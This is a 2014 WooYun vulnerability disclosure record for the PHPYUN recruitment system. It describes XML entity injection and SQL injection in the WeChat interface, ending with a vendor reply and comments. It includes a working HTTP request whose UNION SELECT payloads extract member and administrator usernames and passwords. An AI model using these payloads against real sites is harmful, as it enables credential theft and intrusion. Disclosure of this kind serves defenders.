{"id": 1478, "wybug_id": "wooyun-2014-064678", "wybug_title": "PHPYUN最新版XML注入及SQL注入获取管理员账号（无视任何防御）", "wybug_corp": "php云人才系统", "wybug_author": "xfkxfk", "wybug_date": "2014-06-12 17:40", "wybug_open_date": "2014-09-10 17:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向公众公开  简要描述： 早上提交了个XML实体读取任意文件的，结果厂商说是数字被提交了，顿时无语了。这里还有一个XML注入及SQL注入，如果说又是数字被提交了，我保证不在挖你们的漏洞了！！！ 详细说明：  首先我们来说一说$GLOBALS[\"HTTP_RAW_POST_DATA\"]这个东东，他会吧POST过来的内容原封不动的传进来，所以phpyun的那些铜墙铁壁的防御也就没用了！！！还是文件：weixin/model/index.class.phpXML实体注入：\nprivate function responseMsg()    {\t\t$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t\t  \t\tif (!empty($postStr)){                              \t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);                $fromUsername = $postObj->FromUserName;                $toUsername = $postObj->ToUserName;                $keyword = trim($postObj->Content);                $time = time();                $textTpl = \"<xml>\t\t\t\t\t\t\t<ToUserName><![CDATA[%s]]></ToUserName>\t\t\t\t\t\t\t<FromUserName><![CDATA[%s]]></FromUserName>\t\t\t\t\t\t\t<CreateTime>%s</CreateTime>\t\t\t\t\t\t\t<MsgType><![CDATA[%s]]></MsgType>\t\t\t\t\t\t\t<Content><![CDATA[%s]]></Content>\t\t\t\t\t\t\t<FuncFlag>0</FuncFlag>\t\t\t\t\t\t\t</xml>\";\t\t\t\tif(!empty( $keyword ))                {              \t\t$msgType = \"text\";                \t$contentStr = \"Welcome to wechat world!\";                \t$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);                \techo $resultStr;                }else{                \techo \"Input something...\";                }        }else {        \techo \"\";        \texit;        }    }\n这里将$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];通过simplexml_load_string解析后的内容，直接带入了$textTpl。然而$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];就是直接获取的POST过来的XML内容，没有经过任何处理，最后将其echo出来了。\n$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);                \techo $resultStr;\n整个过程就是传一个XML的内容进去，然后输出一个XML的内容，那么我们结果XML实体注入不就可以读取服务器上的内容，然后再输出出来么？！##############这个应该不会重复了吧！################SQL注入\nif($MsgType=='event')\t\t\t  {\t\t\t\t$MsgEvent = $postObj->Event;\t\t\t\tif ($MsgEvent=='subscribe')\t\t\t\t{\t\t\t\t\t$centerStr = \"<Content><![CDATA[欢迎您关注\".iconv('gbk','utf-8',$this->config['sy_webname']).\"！\\n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位\\n绑定您的账户体验更多精彩功能\\n感谢您的关注！]]></Content>\";\t\t\t\t\t$this->MsgType = 'text';\t\t\t\t}elseif ($MsgEvent=='CLICK')\t\t\t\t{\t\t\t\t\t$EventKey = $postObj->EventKey;\t\t\t\t\tif($EventKey=='我的帐号'){\t\t\t\t\t\t$centerStr = $this->bindUser($fromUsername);\t\t\t\t\t}elseif($EventKey=='我的消息')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->myMsg($fromUsername);\t\t\t\t\t}elseif($EventKey=='面试邀请')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->Audition($fromUsername);\t\t\t\t\t}elseif($EventKey=='简历查看')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->lookResume($fromUsername);\t\t\t\t\t}elseif($EventKey=='刷新简历')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->refResume($fromUsername);\n从代码中开出，当满足那上面的条件后都会进入各种的函数，但是都会进入一个isBind函数。例如EventKey=我的账号，就会进入bindUser函数：\nprivate function bindUser($wxid='')\t{\t\t\t$bindType = $this->isBind($wxid);\t\t$this->MsgType = 'text';\t\t\t\treturn $bindType['cenetrTpl'];\t\t\t}\n然后，我们来看看这个isBind函数：\nprivate function isBind($wxid='')\t{\t\t\tif($wxid)\t\t{\t\t\t$User = $this->obj->DB_select_once(\"member\",\"`wxid`='\".$wxid.\"'\",\"`uid`,`username`\");\t\t}\t\tif($User['uid']>0)\t\t{\t\t\t$User['bindtype'] = '1';\t\t\t$User['cenetrTpl'] = \"<Content><![CDATA[您的\".iconv('gbk','utf-8',$this->config['sy_webname']).\"帐号：\".$User['username'].\"已成功绑定！ \\n\\n\\n 您也可以<a href=\\\"\".$this->config['sy_weburl'].\"/wap/index.php?m=login&wxid=\".$wxid.\"\\\">点击这里</a>进行解绑或绑定其他帐号]]></Content>\";\t\t}else{\t\t\t$Token = $this->getToken();\t\t\t$Url = 'https://api.weixin.qq.com/cgi-bin/user/info?access_token='.$Token.'&openid='.$wxid.'&lang=zh_CN';\t\t\t$CurlReturn  = $this->CurlPost($Url);\t\t\t$UserInfo    = json_decode($CurlReturn);\t\t\t\t\t\t$wxid        = $wxid;\t\t\t$wxname      = $UserInfo->nickname;\t\t\t$this->config['token_time'] = time();\t\t\t$User['cenetrTpl'] = '<Content><![CDATA[您还没有绑定帐号，<a href=\"'.$this->config['sy_weburl'].'/wap/index.php?m=login&wxid='.$wxid.'\">点击这里</a>进行绑定!]]></Content>';\t\t}\t\treturn $User;\t}\n这里的$wxid就是我们传进来的FromUserName的值，直接进入SQL语句，这里可以任意注入。   漏洞证明：  默认是没有wx_token的。这里要注意：signature=da39a3ee5e6b4b0d3255bfef95601890afd80709Content-Type: text/xml发送请求：\nPOST /phpyun/weixin/index.php?m=index&c=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: text/xml;charset=utf-8Content-Length: 354<?xml version=\"1.0\" encoding=\"utf-8\"?><xml>  <ToUserName>1111</ToUserName>  <FromUserName>1111' and 1=2 union select 1,(select concat(username,password) from phpyun_member limit 0,1)#</FromUserName>  <CreateTime>1402550611</CreateTime>  <MsgType>event</MsgType>  <Event>CLICK</Event>  <EventKey>我的账号</EventKey>  <FuncFlag>0</FuncFlag></xml>\n\n\n返回结果，插件页面源代码：\n\n成功获取用户信息。发送：<FromUserName>1111' and 1=2 union select 1,(select concat(username,0x23,password) from phpyun_admin_user limit 0,1)#</FromUserName>即可获取管理员用户账号。   修复方案：  默认安装时加上随机wx_token，或者处理输入的内容，防御系统在这里已经没用了，着这里在处理一下吧。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-06-12 17:50 厂商回复： 非常感谢您的提供，我们会加强TOKEN及参数验证，对于之前说的有其他安全平台提前提交，我们只是阐述下确有其事，没有其他任何意思，还望不要介意！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-12 17:43 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  行，不挖了！！给我透露透露吧    \n     2014-06-12 17:57 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  xfkxfk 你又调皮了    \n     2014-06-12 17:59 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  暴走了啊。nb    \n     2014-06-12 17:59 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  你赢了 我删源码了。。。    \n     2014-06-12 18:02 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @索马里的海贼 坚持就是胜利，真的，别删    \n     2014-06-12 18:04 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @索马里的海贼 删吧，再见~    \n     2014-06-15 18:11 |    \t\t滨湖虎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:6        | 阿弥陀佛)\t\t \n  大婶 你是在刷洞吗    \n     2014-06-16 15:53 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  瞬间刷屏了    \n     2014-09-10 17:44 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:815 漏洞数:99        | 打酱油的~)\t\t \n  一个洞还分两个发。。。    \n     2014-09-11 20:51 |    \t\twellsun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | www.wellsun.com)\t\t \n  诚心诚信RMB收购乌云币~ 价格加Q谈：7520024 （加者备注）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}